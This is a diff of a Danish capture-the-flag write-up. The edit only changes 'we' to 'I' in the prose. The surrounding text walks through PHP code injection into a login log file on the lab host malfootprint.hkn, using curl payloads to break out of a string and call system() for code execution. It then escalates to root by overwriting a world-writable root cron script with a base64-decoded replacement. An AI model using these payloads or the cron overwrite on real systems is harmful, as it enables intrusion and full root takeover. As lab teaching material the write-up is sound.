@@ -40,7 +40,7 @@ flyttet. Backend er PHP 8.2.19.</li>
 <li><strong>De billige webangreb er allerede udelukket.</strong> SQLi-login-bypass og PHP
 array-juggling blev testet negativt i en tidligere session. Stored XSS i loggen er reel, men der
 er ingen admin-bot der besøger siden, så den fører ingen steder hen. Et underviser-hint bekræftede
-retningen: <strong>code injection</strong>. Vi viser her hvorfor den konklusion også kan nås fra
+retningen: <strong>code injection</strong>. Jeg viser her hvorfor den konklusion også kan nås fra
 observation alene.</li>
 </ol>
 <h2>Find lagringsformatet: derfor er det kode, ikke data</h2>
@@ -49,8 +49,8 @@ observation alene.</li>
 hvert fejlet login RÅT ind i den fil, og serveren eksekverer filen når den hentes. Et logget forsøg
 ender som en linje i stil med:</p>
 <pre><code>&lt;?php echo "Fejlet login fra '&lt;USERNAME&gt;' på tidspunktet &lt;TID&gt;&lt;br&gt;"; ?&gt;</code></pre>
-<p>Vores <code>username</code> konkateneres ind i en <strong>dobbelt-citeret</strong> PHP-streng.
-Spørgsmålet er kun: havner vores input i streng-kontekst (ufarligt) eller i kode-kontekst (RCE)?
+<p>Mit <code>username</code> konkateneres ind i en <strong>dobbelt-citeret</strong> PHP-streng.
+Spørgsmålet er kun: havner mit input i streng-kontekst (ufarligt) eller i kode-kontekst (RCE)?
 Det afgøres med to markører, ikke med et gæt. Feltnavnene (<code>username</code>, og
 delete-feltet senere) aflæses fra selve login-formularen:</p>
 <pre><code># Markør 1: et helt PHP-tag inde i strengen
@@ -64,8 +64,8 @@ curl -s "http://malfootprint.hkn/admin/login.php" \
   --data-urlencode 'username=&lt;?php echo "MFPMARK' --data 'password=x'
 curl -s "http://malfootprint.hkn/admin/login_log.php"
 # -> PHP parse error: unexpected identifier "MFPMARK", expecting "," or ";"</code></pre>
-<p>Parse error'en er beviset: vores <code>"</code> lukkede serverens streng, og alt efter blev
-tolket som PHP-kode. Markør 1 alene ville have narret os til at tro input var inert. To markører,
+<p>Parse error'en er beviset: mit <code>"</code> lukkede serverens streng, og alt efter blev
+tolket som PHP-kode. Markør 1 alene ville have narret mig til at tro input var inert. To markører,
 én der tester streng-kontekst og én der tester kode-kontekst, adskiller de to muligheder entydigt.</p>
 <h2>RCE som phpuser: luk strengen, kald system()</h2>
 <p>Når break-out er bekræftet, er payloaden bare at lukke anførselstegnet, konkatenere
@@ -76,7 +76,7 @@ curl -s "http://malfootprint.hkn/admin/login_log.php"</code></pre>
 <p>Den genererede kildelinje bliver:</p>
 <pre><code>&lt;?php echo "Fejlet login fra '" . system("id") . "' på tidspunktet ..."; ?&gt;
 # uid=1000(phpuser) gid=1000(phpuser) groups=1000(phpuser)</code></pre>
-<p>Vi har kodeeksekvering som <code>phpuser</code>. Loggen kan ryddes mellem forsøg med et
+<p>Jeg har kodeeksekvering som <code>phpuser</code>. Loggen kan ryddes mellem forsøg med et
 <code>POST /admin/log.php</code> med feltet <code>delete_log</code> (det virker uden login, og er
 præcis det der fik narrativets "mine logs var tomme" til at passe).</p>
 <h2>Privesc: et world-writable script der kører som root</h2>
@@ -85,10 +85,10 @@ root, så <code>phpuser</code> kan ikke læse flaget direkte. Enumerér i stedet
 RCE:</p>
 <pre><code>username=" . system("cat /etc/cron.d/log_backup; ls -la /app/EUJFYHDKRNTXQVCSLZGWMP/") . "
 # * * * * * root /app/EUJFYHDKRNTXQVCSLZGWMP/log_backup.sh     &lt;- kører hvert minut SOM ROOT
-# -rwxrwxrwx 1 phpuser phpuser 1833 ... log_backup.sh           &lt;- 777, skrivbar af os</code></pre>
+# -rwxrwxrwx 1 phpuser phpuser 1833 ... log_backup.sh           &lt;- 777, skrivbar af mig</code></pre>
 <p>Det er den fulde privesc i to egenskaber der mødes: scriptet <em>kører som root</em>, og det er
-<em>skrivbart af os</em>. Vi behøver ingen kernel-exploit, vi overskriver bare scriptets indhold og
-venter på at root selv kører det. For at undgå at kæmpe med nestede anførselstegn skriver vi det nye
+<em>skrivbart af mig</em>. Jeg behøver ingen kernel-exploit, jeg overskriver bare scriptets indhold og
+venter på at root selv kører det. For at undgå at kæmpe med nestede anførselstegn skriver jeg det nye
 script via base64, så ingen citater fra payloaden kolliderer med injection-konteksten:</p>
 <pre><code>username=" . system("echo &lt;BASE64&gt; | base64 -d &gt; /app/EUJFYHDKRNTXQVCSLZGWMP/log_backup.sh") . "</code></pre>
 <p>hvor det afkodede script er:</p>
